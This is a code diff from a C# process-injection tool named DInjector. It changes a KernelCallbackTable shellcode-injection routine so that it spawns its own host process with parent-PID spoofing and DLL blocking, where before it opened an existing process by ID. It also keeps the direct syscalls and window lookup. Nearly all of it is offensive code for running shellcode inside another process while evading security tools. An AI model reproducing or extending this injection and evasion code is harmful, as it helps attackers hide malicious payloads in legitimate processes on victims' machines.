@@ -9,35 +9,30 @@ namespace DInjector
 {
     class RemoteThreadKernelCB
     {
-        public static void Execute(byte[] shellcode, int processID)
+        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false)
         {
-            #region NtOpenProcess
+            #region CreateProcessA
 
-            IntPtr hProcess = IntPtr.Zero;
-            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
-            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };
-
-            var ntstatus = Syscalls.NtOpenProcess(
-                ref hProcess,
-                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
-                ref oa,
-                ref ci);
-
-            if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadKernelCB) [+] NtOpenProcess");
-            else
-                throw new Exception($"(RemoteThreadKernelCB) [-] NtOpenProcess: {ntstatus}");
+            var pi = SpawnProcess.Execute(
+                processImage,
+                @"C:\Windows\System32",
+                suspended: false,
+                ppid: ppid,
+                blockDlls: blockDlls);
 
             #endregion
 
+            IntPtr hProcess = pi.hProcess;
+            _ = Win32.WaitForInputIdle(hProcess, 2000);
+
             #region NtQueryInformationProcess
 
-            DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint returnLength = 0;
 
-            ntstatus = Syscalls.NtQueryInformationProcess(
+            var ntstatus = Syscalls.NtQueryInformationProcess(
                 hProcess,
-                DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
+                PROCESSINFOCLASS.ProcessBasicInformation,
                 ref bi,
                 (uint)(IntPtr.Size * 6),
                 ref returnLength);
@@ -182,7 +177,7 @@ namespace DInjector
 
             #region FindWindowExA
 
-            IntPtr hWindow = Win32.FindWindowExA(IntPtr.Zero, IntPtr.Zero, Process.GetProcessById(processID).ProcessName, null);
+            IntPtr hWindow = Win32.FindWindowExA(IntPtr.Zero, IntPtr.Zero, Process.GetProcessById((int)pi.dwProcessId).ProcessName, null);
 
             #endregion
 
